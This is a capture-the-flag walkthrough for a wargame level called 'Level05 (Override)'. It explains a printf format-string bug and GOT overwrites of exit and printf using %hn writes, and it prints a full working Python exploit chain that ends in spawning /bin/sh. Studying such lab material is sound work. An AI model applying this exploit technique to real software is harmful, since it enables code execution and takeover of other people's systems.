# Level05 (Override) — In-Depth Walkthrough

This walkthrough explains the reasoning behind your Level05 solution: what the vulnerability is, how it is identified from the binary/disassembly, and why your 3-stage payload works reliably.

---

## 1) Vulnerability overview

The core bug is a **format-string vulnerability**.

From the disassembly of `main`:

- `fgets` reads user input into a stack buffer (`0x08048475` call to `fgets@plt`)
- then the program calls `printf` with that buffer as format string (`0x08048507` call to `printf@plt`)
- then it calls `exit` (`0x08048513` call to `exit@plt`)

So the vulnerable logic is effectively:

```c
fgets(buf, 100, stdin);
...
printf(buf);   // unsafe: attacker controls format string
exit(0);
```

Because `printf` interprets `%...` sequences, attacker-controlled input can:

1. read stack data (`%x`, `%p`, ...), and
2. **write memory** via `%n`/`%hn`.

That write primitive is enough to hijack control flow through GOT entries.

---

## 2) Why GOT overwrite is the right target

On 32-bit ELF with dynamic linking:

- `printf@plt` dispatches through `printf@GOT` (`0x080497d4`)
- `exit@plt` dispatches through `exit@GOT` (`0x080497e0`)

If we overwrite a GOT slot, the program will jump to our chosen address when that function is called next.

This is ideal here because:

- we already control one dangerous `printf(buf)` call,
- `exit()` is called immediately after it,
- and `printf()` is called in every loop iteration.

---

## 3) Discovery steps (how you find this in practice)

### 3.1 Confirm format-string control

Run with marker + format tokens:

```bash
./level05
iiii %x %x %x %x %x %x %x %x %x %x %x %x
```

Seeing stack-like values printed confirms that input is interpreted as format string.

### 3.2 Find where your input sits on stack

Use positional prints (`%1$x`, `%2$x`, ... or many `%p`) until a marker from your buffer appears.

You observed your controlled bytes around argument positions used later as `%10$hn` and `%11$hn`.

### 3.3 Confirm write targets

Use relocations:

```bash
objdump -R level05 | egrep 'printf|exit'
```

Relevant entries:

- `printf@GOT = 0x080497d4`
- `exit@GOT   = 0x080497e0`

### 3.4 Get runtime `system` address

From `gdb` on target libc/session:

```gdb
p system
```

Your payload uses `SYSTEM = 0xf7e6aed0`.

---

## 4) Important binary behavior from disassembly

Before `printf`, the program loops over the input buffer and transforms uppercase ASCII:

- if byte is in `[0x41..0x5a]` (`'A'..'Z'`), it XORs with `0x20` (turns into lowercase)

Implication:

- avoid relying on uppercase letters in payload control text,
- your exploit uses lowercase directives and `/bin/sh`, so it remains valid.

---

## 5) Reasoning behind your helper: `fmt_write_2bytes`

Your function:

```python
def fmt_write_2bytes(addr, value, i1=10, i2=11):
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff

    a_lo = struct.pack('<I', addr)
    a_hi = struct.pack('<I', addr + 2)

    if lo <= hi:
        head = a_lo + a_hi
        p1 = (lo - 8) % 0x10000
        p2 = (hi - lo) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)
    else:
        head = a_hi + a_lo
        p1 = (hi - 8) % 0x10000
        p2 = (lo - hi) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)
```

### Why `%hn` and not `%n`

- `%n` writes 32-bit count directly (hard to tune exactly in one shot).
- `%hn` writes 16-bit count, so 32-bit pointer is built as 2 writes (`addr`, `addr+2`).

### Why prepend two packed addresses

The payload starts with raw pointers (`head`), so `%10$hn` and `%11$hn` can dereference them as destination addresses.

### Why `-8`

Two addresses = 8 bytes printed before padding starts. `%hn` writes total printed count, so first target subtracts 8.

### Why conditional order (`lo <= hi`)

`printf`’s printed count only increases. Writing the smaller half first avoids negative padding and keeps arithmetic stable.

### Why `% 0x10000`

`%hn` stores lower 16 bits only; modulo arithmetic handles wrap-around cleanly.

---

## 6) Deep reasoning for the 3-stage chain

Your exploit input stream is:

1. payload to write `exit@GOT -> main`
2. payload to write `printf@GOT -> system`
3. string `"/bin/sh"`

### Stage 1: `exit@GOT -> main`

After first vulnerable `printf(buf)`, program calls `exit(0)`. If unchanged, process ends and exploitation stops.

By rewriting `exit@GOT` to `main`, that call becomes a jump back into `main` (re-entry), giving another controlled input round.

This stage is about **persistence/control-flow recovery**.

### Stage 2: `printf@GOT -> system`

Now that program continues running, second format payload overwrites `printf@GOT` with runtime `system`.

From now on, every `printf(buf)` call is effectively `system(buf)`.

This stage is about converting a format-string primitive into **direct command execution**.

### Stage 3: send `/bin/sh`

Third input is plain `/bin/sh`.

Because `printf` is already redirected, program executes:

```c
system("/bin/sh")
```

This stage is the **trigger**.

---

## 7) Why `(...; cat) | ./level05` matters

Using:

```bash
(python - <<'PY'
# payload lines
PY
cat) | ./level05
```

keeps stdin open after Python exits.

Without trailing `cat`, pipe can close immediately and spawned shell may receive EOF and terminate. `cat` keeps the shell interactive.

---

## 8) Full exploit used

```bash
(python - <<'PY'
import struct

EXIT_GOT   = 0x080497e0
PRINTF_GOT = 0x080497d4
MAIN       = 0x08048444

# Put the real runtime system() address here from gdb on target
SYSTEM     = 0xf7e6aed0

def fmt_write_2bytes(addr, value, i1=10, i2=11):
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff

    a_lo = struct.pack('<I', addr)
    a_hi = struct.pack('<I', addr + 2)

    if lo <= hi:
        head = a_lo + a_hi
        p1 = (lo - 8) % 0x10000
        p2 = (hi - lo) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)
    else:
        head = a_hi + a_lo
        p1 = (hi - 8) % 0x10000
        p2 = (lo - hi) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)

# Stage 1: exit@GOT -> main (keeps process alive)
print fmt_write_2bytes(EXIT_GOT, MAIN)

# Stage 2: printf@GOT -> system
print fmt_write_2bytes(PRINTF_GOT, SYSTEM)

# Stage 3: this becomes system("/bin/sh")
print "/bin/sh"
PY
cat) | ./level05
```

---

## 9) Final mental model

Your exploit is clean because it separates concerns:

1. **Get another turn** (`exit -> main`)
2. **Replace a function pointer** (`printf -> system`)
3. **Send command string** (`/bin/sh`)

That is the reasoning behind the chain: convert one transient format-string bug into a stable execution path and then into shell execution.
